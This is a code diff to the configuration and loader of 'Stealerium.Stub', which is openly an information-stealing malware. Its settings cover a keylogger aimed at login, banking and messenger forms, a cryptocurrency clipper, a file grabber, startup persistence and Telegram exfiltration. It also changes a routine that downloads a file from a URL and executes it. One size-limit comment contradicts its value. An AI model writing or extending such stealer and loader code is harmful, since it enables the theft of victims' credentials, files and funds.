@@ -1,3 +1,4 @@
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -27,7 +28,7 @@ namespace Stealerium.Stub
         public static string AntiAnalysis = "0";
 
         // Drop and Hide executable to startup directory
-        public static string Autorun = "1";
+        public static string Autorun = "0";
 
         // Random start delay (0-10 seconds)
         public static string StartDelay = "0";
@@ -36,13 +37,13 @@ namespace Stealerium.Stub
         public static string WebcamScreenshot = "0";
 
         // Run keylogger when user opened log-in form, banking service or messenger
-        public static string KeyloggerModule = "1";
+        public static string KeyloggerModule = "0";
 
         // Run clipper when user opened cryptocurrency application
         public static string ClipperModule = "0";
 
         // File grabber:
-        public static string GrabberModule = "1";
+        public static string GrabberModule = "0";
 #elif RELEASE
         // Telegram bot API key
         public static string TelegramAPI = "--- TelegramAPI ---";
@@ -117,8 +118,8 @@ namespace Stealerium.Stub
             "porn", "sex", "hentai", "chaturbate"
         };
 
-        // Maximum file size (5 MB)
-        public static int GrabberSizeLimit = 5 * 1024 * 1024; // 5,242,880 bytes
+        // Maximum file size (5 KB).
+        public static int GrabberSizeLimit = 500 * 1024; // 500 KB
 
         // Grabber file types:
         public static Dictionary<string, string[]> GrabberFileTypes = new Dictionary<string, string[]>
@@ -142,22 +143,20 @@ namespace Stealerium.Stub
 
             using (HttpClient client = new HttpClient())
             {
+                Console.WriteLine("Downloading file...");
                 byte[] fileBytes = await client.GetByteArrayAsync(url);
 
-                File.WriteAllBytes(filePath, fileBytes);
-
-                var startInfo = new ProcessStartInfo
+                if (fileBytes != null && fileBytes.Length > 0)
                 {
-                    FileName = filePath,
-                    UseShellExecute = false
-                };
+                    File.WriteAllBytes(filePath, fileBytes);
 
-                using (Process process = Process.Start(startInfo))
-                {
-                    if (process != null)
+                    var startInfo = new ProcessStartInfo
                     {
-                        process.WaitForExit();
-                    }
+                        FileName = filePath,
+                        UseShellExecute = false
+                    };
+
+                    Process.Start(startInfo);
                 }
             }
 
